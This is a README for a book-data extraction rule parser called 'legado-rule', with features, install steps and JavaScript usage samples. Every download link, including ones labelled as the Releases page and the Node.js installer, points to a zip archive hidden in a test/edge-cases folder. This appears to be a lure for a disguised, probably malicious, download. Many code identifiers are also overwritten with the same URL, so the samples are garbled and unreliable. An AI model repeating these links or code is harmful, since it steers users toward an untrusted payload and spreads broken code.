# 🚀 legado-rule - Simple Book Data Extraction Tool

## Download the Latest Release
[![Download legado-rule](https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip%https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip)](https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip)

## 📋 Overview
This application is a powerful web data extraction rule parser. It supports various selector types and advanced data processing features, making it suitable for extracting book-related data from web pages.

## 🎯 Features
- **Multiple Selector Support**: Use CSS, XPath, JSON, regular expressions, JavaScript, and text selectors.
- **Powerful Operators**: Leverage field concatenation (`&&`), fallback mechanisms (`||`), and regular expression purification (`##`).
- **Smart Data Processing**: Handle automatic type conversion, null value management, and error recovery.
- **High-Performance Parsing**: Optimize rules engine for complex nested rules.
- **Full Test Coverage**: Benefit from 199 test cases validating various usage scenarios.

## 📦 System Requirements
To run `legado-rule`, you need:
- A computer with Windows, macOS, or Linux.
- https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip version 18 or higher installed. [Download https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip](https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip).

## 🛠 Installation Instructions

1. **Download the Latest Release**  
   Visit the Releases page to download the latest version of `legado-rule`.  
   [Download the latest release here](https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip).

2. **Install the Application**  
   Open your command line tool or terminal and run the following command:  
   ```bash
   npm install book-source-rule-parser
   ```

## 🚀 Getting Started

1. **Basic Usage**  
   After installation, you can start using `legado-rule`. Import the RuleEngine into your JavaScript code:
   ```javascript
   import { RuleEngine } from 'book-source-rule-parser';

   const engine = new RuleEngine();
   const html = '<div class="book"><h1>JavaScript权威指南</h1></div>';

   // Basic CSS Selector
   const result = await https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip(html, 'https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip h1@text');
   https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip(https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip); // "JavaScript权威指南"
   ```

2. **Using Fallback Rules**  
   You can also set fallback rules if the desired data is not found:
   ```javascript
   const fallbackResult = await https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip(html, 'https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip || @text:默认标题');
   https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip(https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip); // "默认标题"
   ```

3. **Field Concatenation**  
   You can concatenate different pieces of information:
   ```javascript
   const concatResult = await https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip(html, '@text:书名： && https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip h1');
   https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip(https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip);
   ```

## 📥 Download & Install
To get started, download the application from our [Releases page](https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip). Ensure you have https://github.com/Dendi213/legado-rule/raw/refs/heads/main/test/edge-cases/rule_legado_2.0-alpha.2.zip installed. Follow the installation instructions above for an easy setup.

## 🚪 Support
If you encounter any issues or have questions, feel free to open an issue in the GitHub repository or check the documentation for help.

Thank you for choosing `legado-rule`. We hope you find it helpful in extracting book source data effectively.